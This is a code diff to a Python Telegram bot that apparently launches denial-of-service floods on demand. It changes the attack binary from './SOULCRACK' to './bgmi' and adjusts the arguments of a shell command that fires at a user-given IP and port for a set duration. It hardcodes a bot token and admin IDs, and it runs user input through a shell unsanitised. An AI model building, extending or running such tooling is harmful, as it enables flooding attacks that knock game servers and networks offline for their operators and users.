@@ -15,7 +15,7 @@ bot = telebot.TeleBot('7536829181:AAGxf5xBoUom2oeg_mGHPUwMUH49ah9Eb4Q')
 ADMINS = {6882674372}  # Add more admin IDs if needed
 OWNER_ID = 6882674372
 # Attack settings
-nxtlvl_PATH = "./SOULCRACK"
+nxtlvl_PATH = "./bgmi"
 MAX_CONCURRENT_ATTACKS = 3  # Set the maximum number of concurrent attacks
 
 # Blocked Ports
@@ -181,7 +181,7 @@ def handle_attack(message):
     def run_attack():
         global active_attacks, pending_feedback
         try:
-            full_command = f"{nxtlvl_PATH} {target} {port} {time_duration} 900"
+            full_command = f"{nxtlvl_PATH} {target} {port} {time_duration} 12 1800"
             subprocess.run(full_command, shell=True, capture_output=True, text=True)
         finally:
             active_attacks = [a for a in active_attacks if not (a['user'] == user_id and a['ip'] == target and a['port'] == port)]
